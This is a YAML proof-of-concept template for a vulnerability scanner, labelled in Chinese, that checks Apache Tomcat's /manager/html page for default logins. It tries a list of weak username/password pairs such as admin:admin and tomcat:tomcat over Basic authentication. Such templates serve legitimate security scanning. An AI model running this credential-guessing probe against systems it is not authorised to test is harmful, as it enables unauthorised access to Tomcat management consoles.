id: poc-yaml-apache-tomcat-weak-password
info:
  name: Apache Tomcat 弱口令漏洞
  severity: high
  tags:
  - 认证绕过
  finger: Tomcat
variables:
  r_basic: 'base64("admin:admin")

    base64("tomcat:tomcat")

    base64("tomcat:123456")

    base64("admin:tomcat")

    base64("admin:123456")

    base64("admin:admin")'
firstRequest:
  method: GET
  path: /manager/html
  expression: 'status_code == 401 && contains(headers, "Tomcat")

    '
requests:
- method: GET
  path: /manager/html
  headers:
    Authorization: Basic {{.r_basic}}
  expression: status_code == 200 && contains(body, "Tomcat")
transport: http
